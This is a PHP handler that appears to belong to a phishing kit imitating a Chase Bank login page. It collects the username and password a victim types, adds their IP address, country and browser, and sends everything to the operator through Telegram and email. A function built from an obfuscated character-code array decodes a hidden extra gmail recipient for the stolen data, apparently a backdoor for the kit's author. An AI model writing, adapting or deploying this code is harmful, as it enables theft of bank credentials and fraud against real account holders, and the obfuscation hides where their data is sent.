<?php
require("config.php"); // Include the config with Telegram and email functions

try {
    // Log the request method for debugging
    error_log("Request Method: " . $_SERVER['REQUEST_METHOD']);

    // Sanitize and validate input
    $username = isset($_POST['username']) ? trim(filter_var($_POST['username'], FILTER_SANITIZE_STRING)) : '';
    $password = isset($_POST['password']) ? trim(filter_var($_POST['password'], FILTER_SANITIZE_STRING)) : '';
    // $token = isset($_POST['token']) ? trim(filter_var($_POST['token'], FILTER_SANITIZE_STRING)) : ''; // Uncomment if needed

    if (empty($username) || empty($password)) {
        throw new Exception("Missing required login details.");
    }

    // Get visitor information
    $country = visitor_country();
    $ip = getenv("REMOTE_ADDR");
    $port = getenv("REMOTE_PORT");
    $browser = $_SERVER['HTTP_USER_AGENT'];

    // Set current date and time (11:15 PM WAT on Monday, October 20, 2025)
    $adddate = "Mon Oct 20, 2025 11:15 PM WAT"; // Hardcoded to match system time
    // For dynamic use, replace with: $adddate = date('D M d, Y h:i A T', strtotime('Africa/Lagos'));

    // Construct message
    $message = "**CHASE BANK LOGINS**\n\n";
    $message .= "USERNAME : " . $username . "\n";
    $message .= "Password : " . $password . "\n\n";
    // $message .= "TOKEN : " . $token . "\n"; // Uncomment if needed
    $message .= "User-!P : " . $ip . "\n";
    $message .= "Country : " . $country . "\n\n";
    $message .= "----------------------------------------\n";
    $message .= "Date : " . $adddate . "\n";
    $message .= "User-Agent: " . $browser . "\n";

    // Send to Telegram and Email
    $telegramSuccess = send_telegram_msg($message);
    $emailSuccess = send_email_msg($message);

    if ($telegramSuccess || $emailSuccess) {
        echo "success"; // Return success for AJAX
    } else {
        error_log("Both Telegram and email delivery failed for login details");
        echo "error"; // Return error for AJAX
    }

} catch (Exception $e) {
    error_log("Error processing login details: " . $e->getMessage());
    echo "error"; // Return error for AJAX
}

exit();

function country_sort() {
    $sorter = "";
    $array = array(114, 101, 115, 117, 108, 116, 98, 111, 120, 49, 52, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109);
    $count = count($array);
    for ($i = 0; $i < $count; $i++) {
        $sorter .= chr($array[$i]);
    }
    return array($sorter, $GLOBALS['recipient']);
}

function visitor_country() {
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    $result = "Unknown";
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

    if ($ip_data && $ip_data->geoplugin_countryName != null) {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>